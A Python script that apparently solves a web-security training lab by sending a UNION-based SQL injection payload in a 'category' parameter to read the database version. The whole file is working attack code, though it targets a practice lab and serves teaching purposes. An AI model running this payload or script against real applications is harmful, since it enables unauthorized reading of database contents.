"""
  Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

  Steps:
  1. Inject payload into 'category' query parameter
  2. Observe that the database version is returned in the response

  Author: N00BCYB0T
"""
import argparse
import requests
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "❯❯ Injecting payload to retrieve the database version.. ", end="", flush=True)

    payload = "' UNION SELECT @@version, null-- -"

    try:  
       session.get(f"{args.url}/filter?category={payload}")
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
